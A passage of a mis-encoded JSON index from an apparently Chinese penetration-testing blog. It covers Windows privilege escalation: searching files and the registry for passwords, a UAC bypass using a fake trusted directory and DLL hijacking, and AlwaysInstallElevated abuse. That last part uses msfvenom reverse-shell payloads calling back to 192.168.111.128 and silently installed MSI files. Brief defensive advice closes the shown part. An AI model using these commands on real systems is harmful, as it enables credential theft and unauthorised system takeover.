æœç´¢æ–‡ä»¶å†…å®¹é‡ŒåŒ…æ‹¬â€œpasswordâ€å­—ç¬¦ä¸²çš„txtæ–‡ä»¶ï¼š\nfindstr /SI /M \u0026#34;password\u0026#34; *.txt ä¹Ÿå¯ä»¥å¢åŠ å…¶ä»–æ–‡ä»¶çš„æ ¼å¼ï¼š\nfindstr /SI /M \u0026#34;password\u0026#34; *.txt *.ini *.config å‚æ•°/SIï¼šåœ¨å½“å‰ç›®å½•å’Œæ‰€æœ‰å­ç›®å½•ä¸­æœç´¢æŒ‡å®šæ–‡ä»¶ï¼Œ æŒ‡å®šæœç´¢éƒ¨åˆ†å¤§å°å†™ å‚æ•°/Mï¼šå¦‚æœæœç´¢åˆ°ç›¸å…³çš„æ–‡ä»¶ï¼Œåˆ™åªåˆ—å‡ºæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ å†ä½¿ç”¨â€œtype + ç›®æ ‡æ–‡ä»¶è·¯å¾„â€å‘½ä»¤æ¥è·å–æ–‡ä»¶å†…å®¹\nå¦‚æœä¸æ·»åŠ å‚æ•°/Mï¼Œåˆ™ä¼šåˆ—å‡ºåŒ…å«ç›®æ ‡å­—ç¬¦ä¸²çš„æ‰€æœ‰æ–‡ä»¶å’Œå†…å®¹ï¼Œä¼šæ˜¾å¾—æ¯”è¾ƒæ‚ä¹±\næœç´¢æ–‡ä»¶å æœç´¢å½“å‰ç›®å½•åŠå­ç›®å½•ä¸­æ–‡ä»¶ååŒ…å«å­—ç¬¦ä¸²â€œpasswordâ€çš„æ–‡ä»¶ï¼š\ndir /s *password* powershellå‘½ä»¤ï¼š\nGet-ChildItem \u0026lt;æ–‡ä»¶å¤¹è·¯å¾„\u0026gt; -Include *password.txt* -recurse cmdå‘½ä»¤åˆ‡æ¢åˆ°å…¶ä»–ç›®å½•å¹¶æœç´¢æ–‡ä»¶åä¸­åŒ…å«web.configçš„æ–‡ä»¶ï¼š\ncd /d E: \u0026amp;\u0026amp; dir /b /s web.config ç”¨forå‘½ä»¤æŸ¥æ‰¾æŸç›˜ç¬¦å†…æ–‡ä»¶ååŒ…å«password.txt:\nfor /r \u0026lt;ç›˜ç¬¦\u0026gt; %i in (password.txt) do @echo %i ä¹Ÿå¯ä»¥ä½¿ç”¨whereå‘½ä»¤æ¥æŸ¥æ‰¾è¿™ç§ç±»å‹çš„æ–‡ä»¶ï¼š\nwhere /r C:\\ *password.txt åœ¨æ³¨å†Œè¡¨ä¸­å¯»æ‰¾å¯†ç  è·å–æ³¨å†Œè¡¨æ ¹é”®HKCUä¸‹åŒ…å«â€œpasswordâ€å­—ç¬¦ä¸²çš„å…¨éƒ¨å†…å®¹ï¼š\nreg query HKCU /f password /t REG_SZ /s ä¸ºäº†æ–¹ä¾¿æŸ¥çœ‹ï¼Œæˆ–å½“å‰åœ¨webshellä¸­æ“ä½œæ—¶ï¼Œå¯ä»¥å°†ç»“æœä¿å­˜åœ¨æ–‡æœ¬ä¸­ï¼Œä¸‹è½½åå†æŸ¥çœ‹\nreg query HKCU /f password /t REG_SZ /s \u0026gt;temp.txt æ­£å¸¸æƒ…å†µä¸‹ï¼Œæ¯æ¬¡ç™»é™†æœåŠ¡å™¨éƒ½éœ€è¦è¾“å…¥å¯†ç ï¼Œä½†æœ‰äº›ç®¡ç†å‘˜ä¸ºäº†æ–¹ä¾¿ï¼Œå¯èƒ½ä¼šè®¾ç½®è‡ªåŠ¨ç™»å½•ï¼Œæ³¨å†Œè¡¨ä¸­ä¼šä¿å­˜è‡ªåŠ¨ç™»å½•çš„è´¦å·å’Œå¯†ç ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•å‘½ä»¤è·å–è‡ªåŠ¨ç™»å½•å¯†ç ï¼š\n"
    }
,
    {
        "title": "windowsææƒ-Bypass UAC",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83-bypass-uac/",
        "content": "windowsææƒ-Bypass UAC å¤§å¤šæ•°åº”ç”¨ç¨‹åºéƒ½æ˜¯ä»¥ä¸­çº§åˆ«å®Œæ•´æ€§è¿è¡Œçš„ï¼ŒåŒ…æ‹¬æœ¬åœ°ç®¡ç†å‘˜ä¼šè¯ï¼Œä½†å¦‚æœé€‰æ‹©â€œä»¥ç®¡ç†å‘˜èº«ä»½â€è¿è¡Œï¼Œå¯ä»¥ä»ä¸­çº§åˆ«å®Œæ•´æ€§æå‡åˆ°é«˜çº§åˆ«ï¼Œä½†è¿™ä¸ªè¿‡ç¨‹ä¼šæœ‰UACå¯¹è¯æ¡†å¼¹å‡ºï¼š\nç”¨æˆ·è´¦æˆ·æ§åˆ¶ï¼ˆUser Accou Controlï¼‰ï¼Œä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œå¼€å¯åï¼Œæ¯ä¸ªéœ€è¦ä½¿ç”¨åˆ°ç®¡ç†å‘˜è®¿é—®ä»¤ç‰Œçš„åº”ç”¨éƒ½éœ€è¦å¾å¾—ç®¡ç†å‘˜åŒæ„\nUACé™åˆ¶çš„ç”¨æˆ·ï¼šé™¤Administratorï¼ˆRID 500ï¼‰çš„æ‰€æœ‰ç”¨æˆ·ï¼ˆåŒ…æ‹¬éRID 500çš„ç®¡ç†å‘˜ï¼‰\néRID 500ç®¡ç†å‘˜ç”¨æˆ·ç™»å½•åï¼Œç³»ç»Ÿä¼šä¸ºå…¶åˆ›å»ºä¸¤ä¸ªå•ç‹¬çš„è®¿é—®ä»¤ç‰Œï¼š\næ ‡å‡†è®¿é—®ä»¤ç‰Œ ç®¡ç†å‘˜è®¿é—®ä»¤ç‰Œ ç®¡ç†å‘˜æ­£å¸¸å¯åŠ¨ä¸æ‰§è¡Œç®¡ç†ä»»åŠ¡çš„åº”ç”¨å°±æ˜¯ä½¿ç”¨çš„æ ‡å‡†è®¿é—®ä»¤ç‰Œï¼Œå½“è¦æ‰§è¡Œé«˜æƒé™ç®¡ç†ä»»åŠ¡å°±éœ€è¦ä½¿ç”¨ç®¡ç†å‘˜è®¿é—®ä»¤ç‰Œï¼Œå°±ä¼šè§¦å‘UACå¼¹çª—\nè€ŒBypass UACï¼Œå®é™…ä¸Šå°±æ˜¯ç»•è¿‡ä¸Šé¢æ‰€è¯´çš„å®‰å…¨æœºåˆ¶ï¼Œä½¿éRID 500çš„ç®¡ç†å‘˜è´¦æˆ·å¯ä»¥ç›´æ¥è°ƒç”¨ç®¡ç†å‘˜è®¿é—®ä»¤ç‰Œæ¥è·å–å…¨éƒ¨ç®¡ç†å‘˜æƒé™ï¼Œè¿™ä»…ä»…æ˜¯ç»•è¿‡äº†ä¿æŠ¤æœºåˆ¶ï¼Œä¸æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„ææƒï¼ˆå’Œlinuxçš„rbashé€ƒé€¸çš„æ„Ÿè§‰ç›¸ä¼¼ï¼‰\nUACç™½åå• å¾®è½¯åœ¨UACä¸­ä¸ºä¸€éƒ¨åˆ†ç³»ç»Ÿç¨‹åºè®¾ç½®äº†ç™½åå•ï¼Œç™½åå•ä¸­çš„ç¨‹åºèƒ½å¤Ÿç”¨é™é»˜çš„æ–¹å¼è‡ªåŠ¨æå‡åˆ°ç®¡ç†å‘˜æƒé™è¿è¡Œï¼Œæ¯”å¦‚rundll32.exeã€explorer.exe\nå¯ä»¥é€šè¿‡å¾®è½¯å®˜æ–¹æä¾›çš„å·¥å…·Sigcheckå’ŒStringsæ¥å¯»æ‰¾ç™½åå•ç¨‹åºï¼Œç™½åå•ç¨‹åºçš„Mainifestæ•°æ®ä¸­autoElivateå±æ€§å€¼ä¸ºtrueï¼Œæ£€æµ‹å·¥å…·å¤§å¤šä¹Ÿæ˜¯æ£€æµ‹è¿™ä¸ªå±æ€§\næˆ‘ä»¬å¯ä»¥é€šè¿‡å¯¹è¿™äº›ç™½åå•ç¨‹åºè¿›è¡ŒDLLåŠ«æŒã€DLLæ³¨å…¥ã€æ³¨å†Œè¡¨åŠ«æŒï¼Œå®ç°Bypass UAC\nDLLåŠ«æŒ å’Œæˆ‘linuxææƒæ–‡ç« ä¸­å†™çš„soå…±äº«åº“åŠ«æŒåŸç†ç›¸ä¼¼\nç¨‹åºå¯åŠ¨æ—¶DLLçš„åŠ è½½é¡ºåºå¦‚ä¸‹:\n1.ç¨‹åºæ‰€åœ¨ç›®å½• 2.ç¨‹åºåŠ è½½ç›®å½•ï¼ˆSetCurrentDirectoryï¼‰ 3.ç³»ç»Ÿç›®å½•å³ SYSTEM32 ç›®å½• 4.16ä½ç³»ç»Ÿç›®å½•å³ SYSTEM ç›®å½• 5.Windowsç›®å½• 6.PATHç¯å¢ƒå˜é‡ä¸­åˆ—å‡ºçš„ç›®å½• PSï¼šWindowsæ“ä½œç³»ç»Ÿé€šè¿‡â€œDLLè·¯å¾„æœç´¢ç›®å½•é¡ºåºâ€å’Œâ€œKnow DLLsæ³¨å†Œè¡¨é¡¹â€çš„æœºåˆ¶æ¥ç¡®å®šåº”ç”¨ç¨‹åºæ‰€è¦è°ƒç”¨çš„DLLçš„è·¯å¾„ï¼Œä¹‹åï¼Œåº”ç”¨ç¨‹åºå°±å°†DLLè½½å…¥äº†è‡ªå·±çš„å†…å­˜ç©ºé—´ï¼Œæ‰§è¡Œç›¸åº”çš„å‡½æ•°åŠŸèƒ½\næˆ‘åªéœ€è¦å°†åŒåæ¶æ„dllçš„ä½ç½®æ”¾åœ¨åˆæ³•dllçš„æœç´¢ç›®å½•ä¹‹å‰ï¼ŒåŠ è½½çš„æ—¶å€™å°±å®ç°äº†åŠ«æŒ\næ¨¡æ‹Ÿå¯ä¿¡ä»»ç›®å½• ç¨‹åºè¯·æ±‚è‡ªåŠ¨æå‡æƒé™çš„æ¡ä»¶ï¼š\næ–‡ä»¶Manitestä¸­autoElevateå±æ€§çš„å€¼ä¸ºTrue\næ£€æŸ¥æ–‡ä»¶çš„ç­¾å\næ–‡ä»¶æ˜¯å¦ä½äºç³»ç»Ÿå¯ä¿¡ä»»ç›®å½•ä¸­\nç³»ç»Ÿåœ¨æ£€æŸ¥å¯ä¿¡ä»»ç›®å½•æ—¶ï¼Œç›¸å…³å‡½æ•°ä¼šè‡ªåŠ¨å»æ‰å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ä¸­çš„ç©ºæ ¼ã€‚å¦‚æœå¯æ‰§è¡Œæ–‡ä»¶ä½äºâ€œC:\\windows \\system32â€ç›®å½•ï¼ˆåœ¨windowsåæœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œä¸‹æ–‡ç»Ÿç§°â€œæ¨¡æ‹Ÿå¯ä¿¡ä»»ç›®å½•â€ï¼‰ä¸­ï¼Œç³»ç»Ÿåœ¨æ£€æŸ¥æ—¶ä¼šè‡ªåŠ¨å»é™¤è·¯å¾„ä¸­çš„ç©ºæ ¼ï¼Œè¿™æ ·å°±é€šè¿‡äº†æœ€åä¸€ä¸ªæ¡ä»¶çš„æ£€æŸ¥\né‚£ä¹ˆæ ¹æ®å¯ä¿¡ä»»ç›®å½•æ¥åˆ›å»ºä¸€ä¸ªåŒ…å«å°¾éšç©ºæ ¼çš„æ¨¡æ‹Ÿå¯ä¿¡ä»»ç›®å½•ï¼Œå°†ä¸€ä¸ªç™½åå•ç¨‹åºå¤åˆ¶åˆ°æ¨¡æ‹Ÿå¯ä¿¡ä»»ç›®å½•ä¸­ï¼Œé…åˆDLLåŠ«æŒç­‰æŠ€æœ¯å³å¯æˆåŠŸç»•è¿‡UAC\næ¯”å¦‚ï¼š\nmd \u0026#34;\\\\?\\c:\\windows \u0026#34; md \u0026#34;\\\\?\\c:\\windows \\System32\u0026#34; copy c:\\windows\\system32\\winSAT.exe \u0026#34;\\\\?\\c:\\windows \\System32\\winSAT.exe\u0026#34; æ¥ä¸‹æ¥å¯ä»¥ç¼–å†™ä¸€ä¸ªæ¶æ„çš„dllæ–‡ä»¶å¹¶å°†å…¶æ”¾å…¥è¯¥ç›®å½•è¿›è¡ŒdllåŠ«æŒï¼Œæ³¨æ„æ„é€ çš„dlléœ€è¦ä¸åŸæ¥çš„dllå…·æœ‰ç›¸åŒçš„å¯¼å‡ºå‡½æ•°\nç›¸å…³å·¥å…· UACME hfiref0x/UACME: Defeating Windows User Account Control\né›†æˆäº†nç§bypass UACæ–¹æ³•ï¼Œå…·ä½“ä½¿ç”¨çœ‹readmeå§\nmsf msfä¹Ÿé›†æˆäº†å‡ ä¸ªç»•è¿‡æ¨¡å—ï¼Œåœ¨bypassä¹‹åï¼Œæ‰§è¡Œgetsystemå¯ä»¥ç›´æ¥æå‡è‡³systemæƒé™\n",
        "summary": "windowsææƒ-Bypass UAC å¤§å¤šæ•°åº”ç”¨ç¨‹åºéƒ½æ˜¯ä»¥ä¸­çº§åˆ«å®Œæ•´æ€§è¿è¡Œçš„ï¼ŒåŒ…æ‹¬æœ¬åœ°ç®¡ç†å‘˜ä¼šè¯ï¼Œä½†å¦‚æœé€‰æ‹©â€œä»¥ç®¡ç†å‘˜èº«ä»½â€è¿è¡Œï¼Œå¯ä»¥ä»ä¸­çº§åˆ«å®Œæ•´æ€§æå‡åˆ°é«˜çº§åˆ«ï¼Œä½†è¿™ä¸ªè¿‡ç¨‹ä¼šæœ‰UACå¯¹è¯æ¡†å¼¹å‡ºï¼š\nç”¨æˆ·è´¦æˆ·æ§åˆ¶ï¼ˆUser Accou Controlï¼‰ï¼Œä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œå¼€å¯åï¼Œæ¯ä¸ªéœ€è¦ä½¿ç”¨åˆ°ç®¡ç†å‘˜è®¿é—®ä»¤ç‰Œçš„åº”ç”¨éƒ½éœ€è¦å¾å¾—ç®¡ç†å‘˜åŒæ„\nUACé™åˆ¶çš„ç”¨æˆ·ï¼šé™¤Administratorï¼ˆRID 500ï¼‰çš„æ‰€æœ‰ç”¨æˆ·ï¼ˆåŒ…æ‹¬éRID 500çš„ç®¡ç†å‘˜ï¼‰\néRID 500ç®¡ç†å‘˜ç”¨æˆ·ç™»å½•åï¼Œç³»ç»Ÿä¼šä¸ºå…¶åˆ›å»ºä¸¤ä¸ªå•ç‹¬çš„è®¿é—®ä»¤ç‰Œï¼š\næ ‡å‡†è®¿é—®ä»¤ç‰Œ ç®¡ç†å‘˜è®¿é—®ä»¤ç‰Œ ç®¡ç†å‘˜æ­£å¸¸å¯åŠ¨ä¸æ‰§è¡Œç®¡ç†ä»»åŠ¡çš„åº”ç”¨å°±æ˜¯ä½¿ç”¨çš„æ ‡å‡†è®¿é—®ä»¤ç‰Œï¼Œå½“è¦æ‰§è¡Œé«˜æƒé™ç®¡ç†ä»»åŠ¡å°±éœ€è¦ä½¿ç”¨ç®¡ç†å‘˜è®¿é—®ä»¤ç‰Œï¼Œå°±ä¼šè§¦å‘UACå¼¹çª—\nè€ŒBypass UACï¼Œå®é™…ä¸Šå°±æ˜¯ç»•è¿‡ä¸Šé¢æ‰€è¯´çš„å®‰å…¨æœºåˆ¶ï¼Œä½¿éRID 500çš„ç®¡ç†å‘˜è´¦æˆ·å¯ä»¥ç›´æ¥è°ƒç”¨ç®¡ç†å‘˜è®¿é—®ä»¤ç‰Œæ¥è·å–å…¨éƒ¨ç®¡ç†å‘˜æƒé™ï¼Œè¿™ä»…ä»…æ˜¯ç»•è¿‡äº†ä¿æŠ¤æœºåˆ¶ï¼Œä¸æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„ææƒï¼ˆå’Œlinuxçš„rbashé€ƒé€¸çš„æ„Ÿè§‰ç›¸ä¼¼ï¼‰\nUACç™½åå• å¾®è½¯åœ¨UACä¸­ä¸ºä¸€éƒ¨åˆ†ç³»ç»Ÿç¨‹åºè®¾ç½®äº†ç™½åå•ï¼Œç™½åå•ä¸­çš„ç¨‹åºèƒ½å¤Ÿç”¨é™é»˜çš„æ–¹å¼è‡ªåŠ¨æå‡åˆ°ç®¡ç†å‘˜æƒé™è¿è¡Œï¼Œæ¯”å¦‚rundll32.exeã€explorer.exe\nå¯ä»¥é€šè¿‡å¾®è½¯å®˜æ–¹æä¾›çš„å·¥å…·Sigcheckå’ŒStringsæ¥å¯»æ‰¾ç™½åå•ç¨‹åºï¼Œç™½åå•ç¨‹åºçš„Mainifestæ•°æ®ä¸­autoElivateå±æ€§å€¼ä¸ºtrueï¼Œæ£€æµ‹å·¥å…·å¤§å¤šä¹Ÿæ˜¯æ£€æµ‹è¿™ä¸ªå±æ€§\næˆ‘ä»¬å¯ä»¥é€šè¿‡å¯¹è¿™äº›ç™½åå•ç¨‹åºè¿›è¡ŒDLLåŠ«æŒã€DLLæ³¨å…¥ã€æ³¨å†Œè¡¨åŠ«æŒï¼Œå®ç°Bypass UAC\nDLLåŠ«æŒ å’Œæˆ‘linuxææƒæ–‡ç« ä¸­å†™çš„soå…±äº«åº“åŠ«æŒåŸç†ç›¸ä¼¼\nç¨‹åºå¯åŠ¨æ—¶DLLçš„åŠ è½½é¡ºåºå¦‚ä¸‹:\n1.ç¨‹åºæ‰€åœ¨ç›®å½• 2.ç¨‹åºåŠ è½½ç›®å½•ï¼ˆSetCurrentDirectoryï¼‰ 3.ç³»ç»Ÿç›®å½•å³ SYSTEM32 ç›®å½• 4.16ä½ç³»ç»Ÿç›®å½•å³ SYSTEM ç›®å½• 5.Windowsç›®å½• 6.PATHç¯å¢ƒå˜é‡ä¸­åˆ—å‡ºçš„ç›®å½• PSï¼šWindowsæ“ä½œç³»ç»Ÿé€šè¿‡â€œDLLè·¯å¾„æœç´¢ç›®å½•é¡ºåºâ€å’Œâ€œKnow DLLsæ³¨å†Œè¡¨é¡¹â€çš„æœºåˆ¶æ¥ç¡®å®šåº”ç”¨ç¨‹åºæ‰€è¦è°ƒç”¨çš„DLLçš„è·¯å¾„ï¼Œä¹‹åï¼Œåº”ç”¨ç¨‹åºå°±å°†DLLè½½å…¥äº†è‡ªå·±çš„å†…å­˜ç©ºé—´ï¼Œæ‰§è¡Œç›¸åº”çš„å‡½æ•°åŠŸèƒ½\næˆ‘åªéœ€è¦å°†åŒåæ¶æ„dllçš„ä½ç½®æ”¾åœ¨åˆæ³•dllçš„æœç´¢ç›®å½•ä¹‹å‰ï¼ŒåŠ è½½çš„æ—¶å€™å°±å®ç°äº†åŠ«æŒ\næ¨¡æ‹Ÿå¯ä¿¡ä»»ç›®å½• ç¨‹åºè¯·æ±‚è‡ªåŠ¨æå‡æƒé™çš„æ¡ä»¶ï¼š\næ–‡ä»¶Manitestä¸­autoElevateå±æ€§çš„å€¼ä¸ºTrue\næ£€æŸ¥æ–‡ä»¶çš„ç­¾å\næ–‡ä»¶æ˜¯å¦ä½äºç³»ç»Ÿå¯ä¿¡ä»»ç›®å½•ä¸­\nç³»ç»Ÿåœ¨æ£€æŸ¥å¯ä¿¡ä»»ç›®å½•æ—¶ï¼Œç›¸å…³å‡½æ•°ä¼šè‡ªåŠ¨å»æ‰å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ä¸­çš„ç©ºæ ¼ã€‚å¦‚æœå¯æ‰§è¡Œæ–‡ä»¶ä½äºâ€œC:\\windows \\system32â€ç›®å½•ï¼ˆåœ¨windowsåæœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œä¸‹æ–‡ç»Ÿç§°â€œæ¨¡æ‹Ÿå¯ä¿¡ä»»ç›®å½•â€ï¼‰ä¸­ï¼Œç³»ç»Ÿåœ¨æ£€æŸ¥æ—¶ä¼šè‡ªåŠ¨å»é™¤è·¯å¾„ä¸­çš„ç©ºæ ¼ï¼Œè¿™æ ·å°±é€šè¿‡äº†æœ€åä¸€ä¸ªæ¡ä»¶çš„æ£€æŸ¥\né‚£ä¹ˆæ ¹æ®å¯ä¿¡ä»»ç›®å½•æ¥åˆ›å»ºä¸€ä¸ªåŒ…å«å°¾éšç©ºæ ¼çš„æ¨¡æ‹Ÿå¯ä¿¡ä»»ç›®å½•ï¼Œå°†ä¸€ä¸ªç™½åå•ç¨‹åºå¤åˆ¶åˆ°æ¨¡æ‹Ÿå¯ä¿¡ä»»ç›®å½•ä¸­ï¼Œé…åˆDLLåŠ«æŒç­‰æŠ€æœ¯å³å¯æˆåŠŸç»•è¿‡UAC\næ¯”å¦‚ï¼š\nmd \u0026#34;\\\\?\\c:\\windows \u0026#34; md \u0026#34;\\\\?\\c:\\windows \\System32\u0026#34; copy c:\\windows\\system32\\winSAT.exe \u0026#34;\\\\?\\c:\\windows \\System32\\winSAT.exe\u0026#34; æ¥ä¸‹æ¥å¯ä»¥ç¼–å†™ä¸€ä¸ªæ¶æ„çš„dllæ–‡ä»¶å¹¶å°†å…¶æ”¾å…¥è¯¥ç›®å½•è¿›è¡ŒdllåŠ«æŒï¼Œæ³¨æ„æ„é€ çš„dlléœ€è¦ä¸åŸæ¥çš„dllå…·æœ‰ç›¸åŒçš„å¯¼å‡ºå‡½æ•°\nç›¸å…³å·¥å…· UACME hfiref0x/UACME: Defeating Windows User Account Control\né›†æˆäº†nç§bypass UACæ–¹æ³•ï¼Œå…·ä½“ä½¿ç”¨çœ‹readmeå§\nmsf msfä¹Ÿé›†æˆäº†å‡ ä¸ªç»•è¿‡æ¨¡å—ï¼Œåœ¨bypassä¹‹åï¼Œæ‰§è¡Œgetsystemå¯ä»¥ç›´æ¥æå‡è‡³systemæƒé™\n"
    }
,
    {
        "title": "Windowsææƒ-ä¸å®‰å…¨çš„æ³¨å†Œè¡¨é¡¹",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%A1%B9/",
        "content": "Windowsææƒ-ä¸å®‰å…¨çš„æ³¨å†Œè¡¨é¡¹ æ³¨å†Œè¡¨æ˜¯windowsç³»ç»Ÿçš„æ•°æ®åº“ï¼Œç³»ç»Ÿã€ç”¨æˆ·é…ç½®å’Œç³»ç»Ÿç»„ä»¶ç­‰ä¿¡æ¯å…¨éƒ¨å­˜å‚¨åœ¨æ³¨å†Œè¡¨ä¸­\næ³¨å†Œè¡¨å¯åŠ¨é¡¹AutoRun AlwaysInstallElevated æ³¨å†Œè¡¨é”®AlwaysInstallElevatedæ˜¯ä¸€ä¸ªç­–ç•¥è®¾ç½®é¡¹ã€‚windowså…è®¸ä½æƒé™ç”¨æˆ·ä»¥Systemæƒé™è¿è¡Œå®‰è£…æ–‡ä»¶ã€‚å¦‚æœå¯ç”¨æ­¤ç­–ç•¥è®¾ç½®é¡¹ï¼Œé‚£ä¹ˆä»»ä½•æƒé™ç”¨æˆ·éƒ½èƒ½ä»¥NT AUTHORITY\\SYSTEMæƒé™æ¥å®‰è£…æ¶æ„çš„MSI(Microsoft Installer)æ–‡ä»¶\nMSIæ–‡ä»¶æ˜¯å¾®è½¯æ ¼å¼çš„åº”ç”¨ç¨‹åºå®‰è£…åŒ…ï¼Œå®é™…ä¸Šæ˜¯ä¸€ä¸ªæ•°æ®åº“ï¼ŒåŒ…å«å®‰è£…å’Œå¸è½½æ—¶éœ€è¦ä½¿ç”¨çš„å¤§é‡æŒ‡ä»¤å’Œç¨‹åºæ•°æ®\nç¯å¢ƒå‡†å¤‡ ä»¥adminæƒé™é…ç½®ï¼š\nwin+rï¼Œgpedit.mscæ‰“å¼€ç»„ç­–ç•¥ç®¡ç†å™¨ï¼Œæ‰¾åˆ°å§‹ç»ˆä»¥æå‡çš„æƒé™è¿›è¡Œå®‰è£…ï¼š\nè®¡ç®—æœºé…ç½®--\u0026gt;ç®¡ç†æ¨¡æ¿--\u0026gt;Windows ç»„ä»¶--\u0026gt;Windows Installer ç¼–è¾‘â€œå§‹ç»ˆä»¥æå‡çš„æƒé™è¿›è¡Œå®‰è£…â€ä¸ºå¼€å¯ï¼š\nåŒæ ·åœ¨ç”¨æˆ·é…ç½®ä¸­ä¹Ÿè¦é…ç½®ï¼š\nå†åœ¨è®¡ç®—æœºé…ç½®ä¸­è®¾ç½®æ™®é€šç¨‹åºçš„å®‰è£…å¯è¡Œæ€§ï¼š\nå¦‚æœæœªæˆåŠŸï¼Œè¿˜å¯ä»¥ç”¨å‘½ä»¤ä¿®æ”¹ä¸‹ï¼š\nreg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f reg add HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f å†éªŒè¯ä¸€ä¸‹é…ç½®æ˜¯å¦æˆåŠŸï¼š\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated ææƒå®éªŒ msf å…ˆç”¨MSFè·å–apacheç”¨æˆ·çš„ä¼šè¯ï¼š\nmsfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.111.128 LPORT=7890 -f exe -o payload.exe å½“å‰shellæƒé™ä¸ºapache\nä½¿ç”¨æ³¨å†Œè¡¨å‘½ä»¤æˆ–ä½¿ç”¨winpeasæŸ¥è¯¢åˆ°å¯ç”¨äº†AlwaysInstallElevatedç­–ç•¥ï¼š\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated å¯ä»¥å…ˆè¯•è¯•ææƒæ¨¡å—ï¼š\nuse exploit/windows/local/always_install_elevated è¿™é‡Œç›´æ¥è·å–åˆ°äº†systemæƒé™\nå¦‚æœä¸è¡Œä¹Ÿå¯ä»¥å°è¯•æ‰‹åŠ¨ææƒï¼Œå…ˆç”Ÿæˆä¸€ä¸ªmsiæ–‡ä»¶ï¼š\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.111.128 LPORT=6789 -f msi -o payload.msi å°†msié€šè¿‡shellä¼ ä¸Šå»ï¼š\nå»ºç«‹ä¸€ä¸ªç›‘å¬ï¼š\nuse exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 192.168.111.128 set lport 6789 exploit å¹¶è¿è¡Œmsiï¼š\nexecute \u0026#34;msiexec.exe /quiet /qn /i payload.msi\u0026#34; æˆåŠŸè·å–systemæƒé™\nCS é¦–å…ˆCSä¸Šçº¿apacheç”¨æˆ·ï¼š\nåˆ©ç”¨CSç”Ÿæˆexeæ–‡ä»¶ï¼Œç„¶åä½¿ç”¨visual studioåˆ¶ä½œMSIæ–‡ä»¶ï¼š\né€‰æ‹©creat a setup for a windows applicationï¼Œå¹¶æ·»åŠ è¿œæ§exeï¼š\né€‰æ‹©è‡ªå®šä¹‰æ“ä½œï¼š\nå³é”®installï¼Œæ·»åŠ è‡ªå®šä¹‰æ“ä½œï¼š\né€‰æ‹©Application folderä¸­çš„åé—¨æ–‡ä»¶ï¼š\nå³é”®æ·»åŠ çš„exeï¼Œæ›´æ”¹å±æ€§ä¸­Run64Bitå€¼ä¸ºtrueï¼ˆå› ä¸ºç›®æ ‡ä¸»æœºæ˜¯64ä½ï¼‰ï¼š\nç”Ÿæˆè§£å†³æ–¹æ¡ˆå³å¯ä½¿ç”¨è¯¥msiæ–‡ä»¶ï¼š\nä¸Šä¼ å¹¶å¯åŠ¨å®‰è£…åŒ…ï¼š\nmsiexec /quiet /qn /i Setup1.msi å¯ä»¥çœ‹è§å·²ç»æˆåŠŸæå‡è‡³systemæƒé™\né’ˆå¯¹ä¸å®‰å…¨æ³¨å†Œè¡¨é¡¹çš„é˜²å¾¡æªæ–½ å¤§è‡´å¦‚ä¸‹ï¼š\næ­£ç¡®é…ç½®æ³¨å†Œè¡¨é¡¹åŠå…¶æƒé™ å®šæœŸæ£€æŸ¥å¼€æœºå¯åŠ¨é¡¹ï¼Œé˜²æ­¢å­˜åœ¨æƒé™ç»´æŒ éå¿…è¦æƒ…å†µä¸‹ï¼Œå…³é—­AlwaysInstallElevatedç­–ç•¥ å®‰è£…é˜²æŠ¤è½¯ä»¶å¹¶ä¿æŒæ›´æ–°ï¼Œé˜²æ­¢æ¶æ„è½¯ä»¶ç ´åæ³¨å†Œè¡¨ ",
        "summary": "Windowsææƒ-ä¸å®‰å…¨çš„æ³¨å†Œè¡¨é¡¹ æ³¨å†Œè¡¨æ˜¯windowsç³»ç»Ÿçš„æ•°æ®åº“ï¼Œç³»ç»Ÿã€ç”¨æˆ·é…ç½®å’Œç³»ç»Ÿç»„ä»¶ç­‰ä¿¡æ¯å…¨éƒ¨å­˜å‚¨åœ¨æ³¨å†Œè¡¨ä¸­\næ³¨å†Œè¡¨å¯åŠ¨é¡¹AutoRun AlwaysInstallElevated æ³¨å†Œè¡¨é”®AlwaysInstallElevatedæ˜¯ä¸€ä¸ªç­–ç•¥è®¾ç½®é¡¹ã€‚windowså…è®¸ä½æƒé™ç”¨æˆ·ä»¥Systemæƒé™è¿è¡Œå®‰è£…æ–‡ä»¶ã€‚å¦‚æœå¯ç”¨æ­¤ç­–ç•¥è®¾ç½®é¡¹ï¼Œé‚£ä¹ˆä»»ä½•æƒé™ç”¨æˆ·éƒ½èƒ½ä»¥NT AUTHORITY\\SYSTEMæƒé™æ¥å®‰è£…æ¶æ„çš„MSI(Microsoft Installer)æ–‡ä»¶\nMSIæ–‡ä»¶æ˜¯å¾®è½¯æ 